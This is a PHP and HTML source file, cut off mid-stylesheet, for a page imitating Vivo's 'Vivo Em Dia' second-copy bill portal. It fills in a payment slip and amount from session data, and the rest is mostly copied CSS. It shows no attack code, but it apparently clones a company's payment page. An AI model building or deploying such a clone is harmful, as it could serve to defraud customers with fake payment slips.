<?php
session_start();
function dividir_string($string) {
    $partes = explode(":", $string);
    $belo = $partes[0];
    $valor = $partes[1];
    return array($belo, $valor);
  }
  list($belo, $valor) = dividir_string($_SESSION['boleto']);
  $_SESSION['valor'] = $valor;
?>
<!DOCTYPE html>
<html lang=pt-br>

<head>
    <meta charset=utf-8>
    <meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
    <meta name=theme-color content=#660096>
    <meta http-equiv=cache-control content="max-age=0">
    <meta http-equiv=cache-control content=no-cache>
    <meta http-equiv=expires content=0>
    <meta http-equiv=expires content="Tue, 01 Jan 1980 1:00:00 GMT">
    <meta http-equiv=pragma content=no-cache>
    <meta name=description content="Vivo em Dia é um portal onde você encontra as informações sobre suas contas em aberto: consulta as contas pendentes, pega a 2ª via, copiar o código de barras, paga com cartão de crédito e verifica quais as opções de negociação disponíveis . Tudo de um jeito rápido, seguro e on-line, sem sair de casa ou de sua empresa.">
    <meta property=og:locale content=pt_BR>
    <meta property=og:title content="Vivo Em Dia">
    <meta property=og:site_name content="Vivo Em Dia">
    <meta property=og:description content="Vivo em Dia é um portal onde você encontra as informações sobre suas contas em aberto: consulta as contas pendentes, pega a 2ª via, copiar o código de barras, paga com cartão de crédito e verifica quais as opções de negociação disponíveis . Tudo de um jeito rápido, seguro e on-line, sem sair de casa ou de sua empresa.">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <!-- CSS do Bootstrap -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/css/bootstrap.min.css">

    <!-- JavaScript do Bootstrap (depende do jQuery) -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/js/bootstrap.bundle.min.js"></script>

    <style>
        @font-face {
            font-family: "Roboto";
            font-style: normal;
            font-weight: 400;
            src: url('');
            unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD
        }

        @font-face {
            font-family: "Roboto";
            font-style: normal;
            font-weight: 700;
            src: url('');
            unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD
        }
    </style>
    <title>Vivo Em Dia | Segunda Via</title>
    <style>
        .layoutDefault {
            min-height: calc(100vh - 100px)
        }

        .headerVivoEmDia {
            align-items: center;
            background: #660096;
            display: flex;
            float: left;
            height: 60px;
            justify-content: center;
            position: relative;
            width: 100%
        }

        .headerVivoEmDia .btnBurger {
            background-color: #52007c;
            cursor: pointer;
            flex-direction: column;
            height: 100%;
            left: 0;
            position: absolute;
            width: 60px;
            z-index: 999
        }

        .headerVivoEmDia .btnBurger div {
            background-color: #fff;
            height: 1.5px;
            margin: 2px 0;
            width: 20px
        }

        .containerVivoEmDia {
            margin-left: auto;
            margin-right: auto;
            max-width: var(--containerMax2);
            padding-left: 15px;
            padding-right: 15px;
            position: relative;
            width: 100%
        }

        .containerInfoCliente {
            color: #fff;
            font-size: var(--fontSize12);
            line-height: 1.3;
            position: absolute;
            right: 3%;
            top: 25%
        }

        .containerInfoCliente .boasVindas {
            font-size: var(--fontSize15);
            font-weight: 400
        }

        .containerInfoCliente .boasVindas .nomeCliente {
            font-weight: 600;
            text-transform: capitalize
        }

        .containerInfoCliente .ultimoAcesso {
            font-size: var(--fontSize9);
            font-weight: 400
        }

        @media only screen and (min-width:1499px) {
            .containerInfoCliente {
                top: 20%
            }
        }

        @media only screen and (max-width:1199px) {
            .layoutDefault {
                min-height: calc(100vh - 155px)
            }

            .containerInfoCliente .ultimoAcesso {
                font-size: var(--fontSize10)
            }
        }

        @-moz-document url-prefix() {
            .layoutDefault {
                display: grid
            }
        }

        .menuUsuario {
            background-color: #660096
        }

        .menuUsuario.close nav {
            height: 0;
            padding: 0;
            width: 0
        }

        .menuUsuario.close nav button {
            font-size: 0 !important;
            margin: 0 !important;
            padding: 0 !important;
            width: 0 !important
        }

        .menuUsuario nav {
            color: #fff;
            display: block;
            min-width: 225px;
            position: relative;
            z-index: 999
        }

        .menuUsuario nav .btnClose {
            background: none;
            border: none;
            color: inherit;
            cursor: pointer;
            font: inherit;
            outline: inherit
        }

        .menuUsuario nav .btnClose:hover {
            color: #e7e7e7
        }

        @-moz-document url-prefix() {
            .menuUsuario.close {
                display: none
            }
        }

        .footerVivoEmDia {
            align-items: center;
            background-color: #52007c;
            color: #fff;
            display: flex;
            font-size: var(--fontSize13);
            height: 100px;
            justify-content: center;
            margin-top: 0;
            padding: 0
        }

        .footerVivoEmDia a,
        .footerVivoEmDia a:hover {
            color: #fff
        }

        .footerVivoEmDia .iconeFooterVivo {
            width: 80px
        }

        @media only screen and (max-width:1199px) {
            .footerVivoEmDia {
                height: 100%
            }

            .footerVivoEmDia .itemFooter {
                display: block;
                text-align: center
            }

            .footerVivoEmDia .itemFooter .siteProtegido {
                font-size: var(--fontSize12);
                padding-bottom: 5px;
                padding-top: 5px
            }

            .footerVivoEmDia .itemFooter .politicaPrivacidade {
                padding-bottom: 5px;
                padding-top: 30px
            }

            .footerVivoEmDia .iconeFooterVivo {
                width: 80px
            }

            .footerVivoEmDia .copyright {
                font-size: var(--fontSize11);
                padding-bottom: 30px;
                text-align: center
            }
        }

        .containerPrincipal {
            max-width: var(--containerMax1);
            padding: 0;
            position: relative
        }

        @-webkit-keyframes inputHighlighter {
            0% {
                background: #5264ae
            }

            to {
                background: transparent;
                width: 0
            }
        }

        @keyframes inputHighlighter {
            0% {
                background: #5264ae
            }

            to {
                background: transparent;
                width: 0
            }
        }

        .containerTipoPagamento {
            display: flex;
            margin-top: 20px
        }

        .containerTipoPagamento .card {
            background-color: #fff;
            border: 1px solid #d9d9d9;
            border-radius: 6px;
            cursor: pointer;
            display: flex;
            flex-direction: column;
            float: left;
            height: 90px;
            justify-content: flex-start;
            margin-right: 20px;
            padding: 14px;
            position: relative;
            width: 90px
        }

        .containerTipoPagamento .card.btn {
            white-space: normal
        }

        .containerTipoPagamento .card .cardDescricao {
            bottom: 10px;
            color: #4d4d4d;
            font-size: var(--fontSize11);
            position: absolute;
            text-align: initial
        }

        .containerTipoPagamento .card:hover {
            background-color: #f7f7f7
        }

        .containerTipoPagamento .card:disabled {
            background-color: inherit
        }

        .containerInfoContrato {
            font-size: var(--fontSize14)
        }

        .containerInfoContrato span {
            color: #660096;
            font-weight: 600
        }

        @media only screen and (max-width:1199px) {
            .containerInfoContrato {
                margin-top: 20px
            }

            .containerTipoPagamento {
                flex-wrap: wrap
            }

            .containerTipoPagamento .card {
                height: 82px;
                margin-right: 5px;
                margin-top: 5px;
                max-width: 33.33333%;
                padding: 12px 8px
            }
        }

        .btn:focus {
            box-shadow: none
        }

        @media only screen and (max-width:1199px) {
            .containerSegundaVia .containerCodigoBarras .containerCopiar {
                font-size: var(--fontSize11);
                height: 70px
            }
        }

        .segundaViaPage .containerSegundaVia .containerCodigoBarras {
            border: 1.5px solid #e6e6e6;
            border-radius: 10px;
            font-size: var(--fontSize13);
            padding: 20px 30px
        }

        .segundaViaPage .containerSegundaVia .containerCodigoBarras .containerCopiar {
            align-items: center;
            background-color: #f6f6f7;
            border-radius: 10px;
            display: flex;
            height: 70px;
            justify-content: center;
            margin-top: 20px;
            padding-right: 60px;
            position: relative;
            text-align: center
        }

        .segundaViaPage .containerSegundaVia .containerCodigoBarras .containerCopiar .iconeCopiar {
            background-color: #660096;
            border-radius: 10px;
            color: #fff;
            cursor: pointer;
            font-size: 22px;
            height: 100%;
            position: absolute;
            right: 0;
            width: 60px
        }

        .segundaViaPage .containerSegundaVia .containerCodigoBarras .linha {
            display: flex;
            justify-content: space-between
        }

        .segundaViaPage .containerSegundaVia .containerCodigoBarras .linha.protocolo {
            border-bottom: 1.5px solid #e6e6e6
        }

        .segundaViaPage .containerSegundaVia .containerCodigoBarras .linha.descricao {
            margin-top: 8px
        }

        .segundaViaPage .containerSegundaVia+.containerTipoPagamento {
            margin-bottom: 20px
        }

        .segundaViaPage .btn:focus {
            box-shadow: none
        }

        @media only screen and (max-width:1199px) {
            .containerSegundaVia .containerCodigoBarras .containerCopiar {
                font-size: var(--fontSize11);
                height: 70px
            }
        }

        /*!
         This file is kept for backward compatibility.
         It is no longer required.
         */
        @-webkit-keyframes dx-valid-badge-frames {
            0% {
                opacity: 0;
                -webkit-transform: scale(.1);
                transform: scale(.1)
            }

            to {
                opacity: 1;
                -webkit-transform: scale(1);
                transform: scale(1)
            }
        }

        @keyframes dx-valid-badge-frames {
            0% {
                opacity: 0;
                -webkit-transform: scale(.1);
                transform: scale(.1)
            }

            to {
                opacity: 1;
                -webkit-transform: scale(1);
                transform: scale(1)
            }
        }

        @-webkit-keyframes dx-loadindicator-icon-custom-rotate {
            0% {
                -webkit-transform: rotate(0);
                transform: rotate(0)
            }

            to {
                -webkit-transform: rotate(1turn);
                transform: rotate(1turn)
            }
        }

        @keyframes dx-loadindicator-icon-custom-rotate {
            0% {
                -webkit-transform: rotate(0);
                transform: rotate(0)
            }

            to {
                -webkit-transform: rotate(1turn);
                transform: rotate(1turn)
            }
        }

        @-webkit-keyframes dx-generic-loadindicator-opacity {
            0% {
                opacity: 1
            }

            to {
                opacity: .55
            }
        }

        @keyframes dx-generic-loadindicator-opacity {
            0% {
                opacity: 1
            }

            to {
                opacity: .55
            }
        }

        @-webkit-keyframes dx-loader {
            0% {
                background-position-x: 0
            }

            to {
                background-position-x: 900%
            }
        }

        @keyframes dx-loader {
            0% {
                background-position-x: 0
            }

            to {
                background-position-x: 900%
            }
        }

        @-webkit-keyframes dx-loader-rtl {
            0% {
                background-position-x: 0
            }

            to {
                background-position-x: -900%
            }
        }

        @keyframes dx-loader-rtl {
            0% {
                background-position-x: 0
            }

            to {
                background-position-x: -900%
            }
        }

        @-webkit-keyframes dx-loadpanel-opacity {
            0% {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        @keyframes dx-loadpanel-opacity {
            0% {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        @-webkit-keyframes dx-datagrid-highlight-change {

            0%,
            50% {
                background-color: rgba(51, 51, 51, .08)
            }
        }

        @keyframes dx-datagrid-highlight-change {

            0%,
            50% {
                background-color: rgba(51, 51, 51, .08)
            }
        }

        @-webkit-keyframes dx-treelist-highlight-change {

            0%,
            50% {
                background-color: rgba(51, 51, 51, .08)
            }
        }

        @keyframes dx-treelist-highlight-change {

            0%,
            50% {
                background-color: rgba(51, 51, 51, .08)
            }
        }

        @-webkit-keyframes dx-filemanager-icon-rotate {
            0% {
                -webkit-transform: rotate(0);
                transform: rotate(0)
            }

            to {
                -webkit-transform: rotate(1turn);
                transform: rotate(1turn)
            }
        }

        @keyframes dx-filemanager-icon-rotate {
            0% {
                -webkit-transform: rotate(0);
                transform: rotate(0)
            }

            to {
                -webkit-transform: rotate(1turn);
                transform: rotate(1turn)
            }
        }

        /*!
         * Bootstrap v4.1.1 (https://getbootstrap.com/)
         * Copyright 2011-2018 The Bootstrap Authors
         * Copyright 2011-2018 Twitter, Inc.
         * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
         */
        :root {
            --blue: #007bff;
            --indigo: #6610f2;
            --purple: #6f42c1;
            --pink: #e83e8c;
            --red: #dc3545;
            --orange: #fd7e14;
            --yellow: #ffc107;
            --green: #28a745;
            --teal: #20c997;
            --cyan: #17a2b8;
            --white: #fff;
            --gray: #6c757d;
            --gray-dark: #343a40;
            --primary: #007bff;
            --secondary: #6c757d;
            --success: #28a745;
            --info: #17a2b8;
            --warning: #ffc107;
            --danger: #dc3545;
            --light: #f8f9fa;
            --dark: #343a40;
            --breakpoint-xs: 0;
            --breakpoint-sm: 576px;
            --breakpoint-md: 768px;
            --breakpoint-lg: 992px;
            --breakpoint-xl: 1200px;
            --font-family-sans-serif: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
            --font-family-monospace: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace
        }

        *,
        :after,
        :before {
            box-sizing: border-box
        }

        html {
            -webkit-text-size-adjust: 100%;
            -ms-text-size-adjust: 100%;
            -ms-overflow-style: scrollbar;
            -webkit-tap-highlight-color: transparent;
            font-family: sans-serif;
            line-height: 1.15
        }

        @-ms-viewport {
            width: device-width
        }

        body {
            background-color: #fff;
            color: #212529;
            font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol;
            font-size: 1rem;
            font-weight: 400;
            line-height: 1.5;
            margin: 0;
            text-align: left
        }

        ul {
            margin-top: 0
        }

        a {
            -webkit-text-decoration-skip: objects;
            background-color: transparent;
            color: #007bff;
            text-decoration: none
        }

        a:hover {
            color: #0056b3;
            text-decoration: underline
        }

        a:not([href]):not([tabindex]),
        a:not([href]):not([tabindex]):focus,
        a:not([href]):not([tabindex]):hover {
            color: inherit;
            text-decoration: none
        }

        a:not([href]):not([tabindex]):focus {
            outline: 0
        }

        img {
            border-style: none;
            vertical-align: middle
        }

        svg:not(:root) {
            overflow: hidden
        }

        button {
            border-radius: 0
        }

        button:focus {
            outline: 1px dotted;
            outline: 5px auto -webkit-focus-ring-color
        }

        button {
            font-family: inherit
        }

        button {
            text-transform: none
        }

        button {
            -webkit-appearance: button
        }

        ::-webkit-file-upload-button {
            -webkit-appearance: button;
            font: inherit
        }

        .container-fluid {
            margin-left: auto;
            margin-right: auto;
            padding-left: 15px;
            padding-right: 15px;
            width: 100%
        }

        .row {
            display: flex;
            flex-wrap: wrap;
            margin-left: -15px;
            margin-right: -15px
        }

        .col-md-1,
        .col-md-3,
        .col-md-4,
        .col-sm-11,
        .col-sm-12 {
            min-height: 1px;
            padding-left: 15px;
            padding-right: 15px;
            position: relative;
            width: 100%
        }

        .col-11 {
            flex: 0 0 91.666667%;
            max-width: 91.666667%
        }

        .col-12 {
            flex: 0 0 100%;
            max-width: 100%
        }

        @media (min-width:576px) {
            .col-sm-11 {
                flex: 0 0 91.666667%;
                max-width: 91.666667%
            }

            .col-sm-12 {
                flex: 0 0 100%;
                max-width: 100%
            }
        }

        @media (min-width:768px) {
            .col-md-1 {
                flex: 0 0 8.333333%;
                max-width: 8.333333%
            }

            .col-md-3 {
                flex: 0 0 25%;
                max-width: 25%
            }

            .col-md-4 {
                flex: 0 0 33.333333%;
                max-width: 33.333333%
            }

            .col-md-6 {
                flex: 0 0 50%;
                max-width: 50%
            }

            .col-md-7 {
                flex: 0 0 58.333333%;
                max-width: 58.333333%
            }

            .col-md-11 {
                flex: 0 0 91.666667%;
                max-width: 91.666667%
            }
        }

        .btn {
            border: 1px solid transparent;
            font-size: 1rem;
            font-weight: 400;
            line-height: 1.5;
            text-align: center;
            transition: color .15s ease-in-out, background-color .15s ease-in-out, border-color .15s ease-in-out, box-shadow .15s ease-in-out;
            -webkit-user-select: none;
            -ms-user-select: none;
            user-select: none;
            vertical-align: middle
        }

        @media screen and (prefers-reduced-motion:reduce) {
            .btn {
                transition: none
            }
        }

        .btn:focus,
        .btn:hover {
            text-decoration: none
        }

        .btn.focus,
        .btn:focus {
            box-shadow: 0 0 0 .2rem rgba(0, 123, 255, .25);
            outline: 0
        }

        .btn.disabled,
        .btn:disabled {
            opacity: .65
        }

        .btn:not(:disabled):not(.disabled) {
            cursor: pointer
        }

        .btn:not(:disabled):not(.disabled).active,
        .btn:not(:disabled):not(.disabled):active {
            background-image: none
        }

        .card {
            word-wrap: break-word;
            background-clip: border-box;
            min-width: 0
        }

        .breadcrumb-item+.breadcrumb-item {
            padding-left: .5rem
        }

        .breadcrumb-item+.breadcrumb-item:before {
            color: #6c757d;
            content: "/";
            display: inline-block;
            padding-right: .5rem
        }

        .breadcrumb-item+.breadcrumb-item:hover:before {
            text-decoration: underline;
            text-decoration: none
        }

        @-webkit-keyframes progress-bar-stripes {
            0% {
                background-position: 1rem 0
            }

            to {
                background-position: 0 0
            }
        }

        @keyframes progress-bar-stripes {
            0% {
                background-position: 1rem 0
            }

            to {
                background-position: 0 0
            }
        }

        .close {
            color: #000;
            float: right;
            font-size: 1.5rem;
            font-weight: 700;
            line-height: 1;
            opacity: .5;
            text-shadow: 0 1px 0#fff
        }

        .close:focus,
        .close:hover {
            color: #000;
            opacity: .75;
            text-decoration: none
        }

        .close:not(:disabled):not(.disabled) {
            cursor: pointer
        }

        @supports ((-webkit-transform-style:preserve-3d) or (transform-style:preserve-3d)) {

            .carousel-item-next.carousel-item-left,
            .carousel-item-prev.carousel-item-right {
                -webkit-transform: translateZ(0);
                transform: translateZ(0)
            }
        }

        @supports ((-webkit-transform-style:preserve-3d) or (transform-style:preserve-3d)) {

            .active.carousel-item-right,
            .carousel-item-next {
                -webkit-transform: translate3d(100%, 0, 0);
                transform: translate3d(100%, 0, 0)
            }
        }

        @supports ((-webkit-transform-style:preserve-3d) or (transform-style:preserve-3d)) {

            .active.carousel-item-left,
            .carousel-item-prev {
                -webkit-transform: translate3d(-100%, 0, 0);
                transform: translate3d(-100%, 0, 0)
            }
        }

        @supports ((-webkit-transform-style:preserve-3d) or (transform-style:preserve-3d)) {

            .carousel-fade .active.carousel-item-left,
            .carousel-fade .active.carousel-item-prev,
            .carousel-fade .carousel-item-next,
            .carousel-fade .carousel-item-prev,
            .carousel-fade .carousel-item.active {
                -webkit-transform: translateZ(0);
                transform: translateZ(0)
            }
        }

        .d-none {
            display: none !important
        }

        @media (min-width:576px) {
            .d-sm-none {
                display: none !important
            }
        }

        @media (min-width:768px) {
            .d-md-block {
                display: block !important
            }
        }

        @supports ((position:-webkit-sticky) or (position:sticky)) {
            .sticky-top {
                position: -webkit-sticky;
                position: sticky;
                top: 0;
                z-index: 1020
            }
        }

        .ml-auto {
            margin-left: auto !important
        }

        @media print {

            *,
            :after,
            :before {
                box-shadow: none !important;
                text-shadow: none !important
            }

            a:not(.btn) {
                text-decoration: underline
            }

            img {
                page-break-inside: avoid
            }

            @page {
                size: a3
            }

            body {
                min-width: 992px !important
            }
        }

        @-webkit-keyframes react-confirm-alert-fadeIn {
            0% {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        @keyframes react-confirm-alert-fadeIn {
            0% {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        @media (max-width:1498px) {
            :root {
                --fontSize7: 7px;
                --fontSize8: 8px;
                --fontSize9: 9px;
                --fontSize10: 10px;
                --fontSize11: 11px;
                --fontSize12: 12px;
                --fontSize13: 13px;
                --fontSize14: 14px;
                --fontSize15: 15px;
                --fontSize16: 16px;
                --fontSize17: 17px;
                --fontSize18: 18px;
                --fontSize19: 19px;
                --fontSize20: 20px;
                --fontSize21: 21px;
                --containerMax1: 1050px;
                --containerMax2: 1000px
            }
        }

        @media (min-width:1499px) {
            :root {
                --fontSize7: 9px;
                --fontSize8: 10px;
                --fontSize9: 11px;
                --fontSize10: 12px;
                --fontSize11: 13px;
                --fontSize12: 14px;
                --fontSize13: 15px;
                --fontSize14: 16px;
                --fontSize15: 17px;
                --fontSize16: 18px;
                --fontSize17: 19px;
                --fontSize18: 20px;
                --fontSize19: 21px;
                --fontSize20: 22px;
                --fontSize21: 23px;
                --containerMax1: 1200px;
                --containerMax2: 1100px
            }
        }

        * {
            font-family: Roboto, sans-serif;
            font-weight: 300
        }

        button {
            -webkit-font-smoothing: inherit;
            -moz-osx-font-smoothing: inherit;
            -webkit-appearance: none;
            background: transparent;
            color: inherit;
            font: inherit;
            line-height: normal;
            margin: 0;
            overflow: visible
        }

        .flexCenter {
            align-items: center;
            display: flex;
            justify-content: center
        }

        .btn:focus {
            box-shadow: 0 0 0 .2rem rgba(102, 0, 153, .75)
        }

        a:hover {
            text-decoration: none
        }

        .breadcrumbVivoEmDia {
            display: flex;
            flex-wrap: wrap;
            font-size: var(--fontSize14);
            list-style: none;
            margin-bottom: 0;
            padding: 0
        }

        .breadcrumbVivoEmDia a {
            color: #660096
        }

        .breadcrumbVivoEmDia i {
            color: #660096;
            font-size: var(--fontSize16)
        }

        .breadcrumbVivoEmDia .breadcrumb-item {
            font-size: var(--fontSize15)
        }

        .breadcrumbVivoEmDia .breadcrumb-item.active {
            color: #c3c3c3
        }

        .breadcrumbVivoEmDia .breadcrumb-item:before,
        .breadcrumbVivoshop .breadcrumb-item:before {
            display: inline-block;
            padding-right: .5rem
        }

        .breadcrumbVivoEmDia .breadcrumb-item+.breadcrumb-item:before,
        .breadcrumbVivoshop .breadcrumb-item+.breadcrumb-item:before {
            content: "-"
        }

        .breadcrumbVivoEmDia {
            padding-top: .75rem
        }

        .btn.card:focus {
            box-shadow: none
        }

        .numCodigoBarra {
            color: #609;
            font-size: var(--fontSize12)
        }

        .numCodigoBarra div {
            font-weight: 400
        }

        .numCodigoBarra .containerNumCodBarras {
            display: flex
        }

        @media only screen and (max-width:1199px) {
            .mobileMrAutoMlAuto {
                margin-left: auto !important;
                margin-right: auto !important
            }

            .numCodigoBarra .containerNumCodBarras {
                flex-direction: column;
                font-size: var(--fontSize10)
            }
        }

        @media only screen and (min-width:1499px) {
            * {
                font-family: Roboto, sans-serif;
                font-weight: 400
            }
        }

        footer.footerVivoEmDia a:hover {
            text-decoration: underline
        }

        /*!
         * Font Awesome Pro 5.10.1 by @fontawesome - https://fontawesome.com
         * License - https://fontawesome.com/license (Commercial License)
         */
        .fad,
        .fal {
            -moz-osx-font-smoothing: grayscale;
            -webkit-font-smoothing: antialiased;
            -webkit-font-feature-settings: normal;
            font-feature-settings: normal;
            text-rendering: auto;
            display: inline-block;
            font-style: normal;
            font-variant: normal;
            line-height: 1
        }

        .fad {
            font-family: Font Awesome\ 5 Duotone;
            font-weight: 900;
            position: relative
        }

        @-webkit-keyframes fa-spin {
            0% {
                -webkit-transform: rotate(0);
                transform: rotate(0)
            }

            to {
                -webkit-transform: rotate(1turn);
                transform: rotate(1turn)
            }
        }

        @keyframes fa-spin {
            0% {
                -webkit-transform: rotate(0);
                transform: rotate(0)
            }

            to {
                -webkit-transform: rotate(1turn);
                transform: rotate(1turn)
            }
        }

        .fa-copy:before {
            content: ""
        }

        .fa-home:before {
            content: ""
        }

        .fa-times:before {
            content: ""
        }

        .fad:before {
            color: inherit;
            color: var(--fa-primary-color, inherit);
            opacity: 1;
            opacity: var(--fa-primary-opacity, 1);
            position: absolute
        }

        .fad:after {
            color: inherit;
            color: var(--fa-secondary-color, inherit)
        }

        .fa-swap-opacity .fad:before,
        .fad.fa-swap-opacity:before,
        .fad:after {
            opacity: .4;
            opacity: var(--fa-secondary-opacity, .4)
        }

        .fad.fa-home:after {
            content: "􏀕"
        }

        .fa-copy:before {
            content: "";
        }

        @font-face {
            font-family: Font Awesome\ 5 Pro;
            font-style: normal;
            font-weight: 300;
            src: url('../public/static/fonts/fa-light-300.42dddfaa1754c3ff88c5.woff2');
            unicode-range: U+f002, U+f005, U+f008-f009, U+f00b-f00c, U+f00e, U+f011, U+f013, U+f017, U+f019, U+f01c, U+f022-f025, U+f029-f02e, U+f030, U+f03e, U+f040-f042, U+f044, U+f047-f04e, U+f050-f05b, U+f05e, U+f060-f066, U+f068-f06a, U+f074, U+f077-f07a, U+f07c-f07e, U+f083-f085, U+f089, U+f08b, U+f08d-f08e, U+f090-f091, U+f093-f095, U+f098, U+f09c-f09e, U+f0a0, U+f0a3-f0ab, U+f0b0, U+f0b2, U+f0c1, U+f0c3, U+f0c5-f0c9, U+f0ce, U+f0d7-f0de, U+f0e0, U+f0e2-f0e3, U+f0e9-f0ea, U+f0ec, U+f0f4, U+f0f8, U+f0fa-f0fe, U+f100-f108, U+f10a-f10b, U+f110-f111, U+f11b-f11c, U+f120-f122, U+f124, U+f126-f12a, U+f12e, U+f132-f134, U+f137-f13a, U+f13d-f13e, U+f141-f146, U+f148-f14d, U+f150-f154, U+f156-f159, U+f15b-f15c, U+f164-f165, U+f175-f178, U+f182-f183, U+f186, U+f188, U+f191-f193, U+f195, U+f197, U+f199, U+f1ab, U+f1ad-f1ae, U+f1b0, U+f1b2-f1b3, U+f1b8, U+f1bb, U+f1c0-f1c5, U+f1c7-f1c9, U+f1cd-f1ce, U+f1d8, U+f1da, U+f1e0-f1e2, U+f1e6, U+f1ea, U+f1f9-f1fa, U+f1fd-f1fe, U+f204-f206, U+f20a-f20b, U+f217-f21a, U+f21c, U+f221-f22d, U+f233, U+f238-f239, U+f240-f244, U+f246-f249, U+f24d, U+f251-f25d, U+f26c, U+f271-f275, U+f27a, U+f28b, U+f28d, U+f290-f292, U+f295, U+f29a, U+f29d-f29e, U+f2a1-f2a4, U+f2a7-f2a8, U+f2b6, U+f2c7-f2ce, U+f2d0-f2d3, U+f2db, U+f2e1, U+f2e3-f2e7, U+f2ea-f2ec, U+f2ee, U+f2f0-f2fd, U+f300-f303, U+f306-f312, U+f316-f31a, U+f31c-f31d, U+f320-f32e, U+f330-f33e, U+f340-f34d, U+f350-f355, U+f357-f35b, U+f35d, U+f360-f367, U+f376, U+f37e, U+f387, U+f389-f38a, U+f390, U+f39b-f39c, U+f3a0, U+f3a5, U+f3b3, U+f3be-f3bf, U+f3c2, U+f3c5, U+f3cd-f3cf, U+f3de, U+f3e5, U+f3ed, U+f3f0, U+f3f2, U+f3f4, U+f3fa-f3fc, U+f3ff-f401, U+f40e-f410, U+f422, U+f424
        }

        @font-face {
            font-family: Font Awesome\ 5 Pro;
            font-style: normal;
            font-weight: 300;
            src: url('../public/static/fonts/fa-light-300.42dddfaa1754c3ff88c5.woff2');
            unicode-range: U+f00d, U+f010, U+f067, U+f072, U+f0ad, U+f0d6, U+f0e8, U+f130-f131, U+f24e, U+f3c9, U+f3d1, U+f515-f517, U+f519-f52c, U+f52e-f533, U+f535-f555
        }

        @font-face {
            font-family: Font Awesome\ 5 Pro;
            font-style: normal;
            font-weight: 300;
            src: url('../public/static/fonts/fa-light-300.42dddfaa1754c3ff88c5.woff2');
            unicode-range: U+f00a, U+f015, U+f06e, U+f070, U+f073, U+f11e, U+f135, U+f1c6, U+f1e4, U+f1f8, U+f2a0, U+f2ed, U+f377, U+f470, U+f49c, U+f49e, U+f4c9, U+f56e-f56f, U+f664, U+f6d6-f6d7, U+f6f4, U+f705, U+f710, U+f725, U+f77e, U+f780, U+f7e5-f7f0, U+f7f2-f7fe, U+f800-f833
        }

        @font-face {
            font-family: Font Awesome\ 5 Pro;
            font-style: normal;
            font-weight: 300;
            src: url('../public/static/fonts/fa-light-300.42dddfaa1754c3ff88c5.woff2');
        }

        .fal {
            font-weight: 300
        }

        .fal {
            font-family: Font Awesome\ 5 Pro
        }

        @font-face {
            font-family: Font Awesome\ 5 Duotone;
            font-style: normal;
            font-weight: 900;
            src: url('../public/static/fonts/fa-duotone-900-pro-5.7.0.a21c2c9c8e8e88086dac.woff2');
            unicode-range: U+f002, U+f005, U+f008-f009, U+f00b-f00c, U+f00e, U+f011, U+f013, U+f017, U+f019, U+f01c, U+f022-f025, U+f02a-f02e, U+f030, U+f040-f042, U+f044, U+f047-f04e, U+f050-f05b, U+f05e, U+f060-f066, U+f068-f06a, U+f074, U+f077-f07a, U+f07c-f07e, U+f085, U+f089, U+f08b, U+f08d-f08e, U+f090-f091, U+f093-f095, U+f098, U+f09c-f09e, U+f0a4-f0ab, U+f0b2, U+f0c1, U+f0c3, U+f0c5-f0c7, U+f0c9, U+f0ce, U+f0d7-f0dc, U+f0e0, U+f0e2-f0e3, U+f0e9-f0ea, U+f0ec, U+f0f4, U+f0f8, U+f0fa-f0fe, U+f100-f108, U+f10a-f10b, U+f110, U+f11b-f11c, U+f120-f122, U+f124, U+f126-f128, U+f12e, U+f132-f134, U+f137-f13a, U+f13d-f13e, U+f141-f144, U+f146, U+f148-f14d, U+f150-f154, U+f156-f159, U+f15c, U+f164-f165, U+f175-f178, U+f182-f183, U+f186, U+f188, U+f191-f193, U+f195, U+f197, U+f199, U+f1ab, U+f1ad-f1ae, U+f1b0, U+f1b2-f1b3, U+f1b8, U+f1bb, U+f1c0-f1c5, U+f1c7-f1c9, U+f1cd-f1ce, U+f1d8, U+f1da, U+f1e0-f1e2, U+f1e6, U+f1ea, U+f1fa, U+f1fd-f1fe, U+f204-f206, U+f20b, U+f217-f218, U+f21a, U+f21c, U+f221-f22d, U+f233, U+f238-f239, U+f240-f244, U+f246, U+f249, U+f24d, U+f255-f25c, U+f26c, U+f271-f274, U+f28b, U+f28d, U+f290-f292, U+f295, U+f29a, U+f29d-f29e, U+f2a1-f2a4, U+f2a7-f2a8, U+f2c7-f2ce, U+f2d0, U+f2d2-f2d3, U+f2db, U+f2e1, U+f2e3-f2e7, U+f2ea-f2ec, U+f2ee, U+f2f0-f2fd, U+f300-f301, U+f303, U+f307-f30f, U+f316-f31a, U+f31c-f31d, U+f320-f326, U+f328-f32e, U+f330-f33e, U+f340-f34c, U+f350-f353, U+f355, U+f358-f35b, U+f35d, U+f360-f367, U+f376, U+f37e, U+f387, U+f389-f38a, U+f390, U+f39b-f39c, U+f3a0, U+f3b3, U+f3be-f3bf, U+f3c2, U+f3c5, U+f3cd-f3cf, U+f3de, U+f3e5, U+f3ed, U+f3f0, U+f3f2, U+f3f4, U+f3fa-f3fc, U+f3ff-f401, U+f40e-f410, U+f422, U+f424, U+10f002, U+10f005, U+10f008-10f009, U+10f00b-10f00c, U+10f00e, U+10f011, U+10f013, U+10f017, U+10f019, U+10f01c, U+10f022-10f025, U+10f02a-10f02e, U+10f030, U+10f040-10f042, 